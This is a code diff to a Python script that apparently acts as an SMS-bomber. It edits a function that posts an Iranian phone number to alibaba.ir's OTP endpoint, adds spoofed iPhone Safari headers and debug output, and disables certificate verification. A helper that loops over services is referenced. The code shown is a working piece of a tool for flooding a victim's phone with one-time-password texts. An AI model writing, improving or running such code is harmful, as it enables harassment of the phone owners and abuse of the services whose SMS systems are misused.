@@ -69,16 +69,30 @@ def send_service_safe(service, phone):
 def alibaba(phone):
     try:
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
         
-        payload = {"phoneNumber": formatted_phone}
+        payload = {
+            "phoneNumber": formatted_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "ab-channel": "WEB-NEW, PRODUCTION,CSR,www.alibaba.ir, mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6,3.200.8",
+            "tracing-sessionid": "ab-alohomora",
+            "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple,iOS",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
+        }
         
         response = requests.post(
             'https://ws.alibaba.ir/api/v3/account/mobile/otp', 
             json=payload,
+            headers=headers,
             timeout=10,
             verify=False
         )
+        
+        print(f'{y}[Debug] alibaba Status: {response.status_code}{a}')
+        print(f'{y}[Debug] alibaba Response: {response.text}{a}')
         
         if response.status_code == 200:
             data = response.json()
@@ -91,9 +105,6 @@ def alibaba(phone):
     except Exception as e:
         print(f"{r}[!] alibaba exception: {e}{a}")
         return False
-
-
-
 
 def mek(phone):
     try:
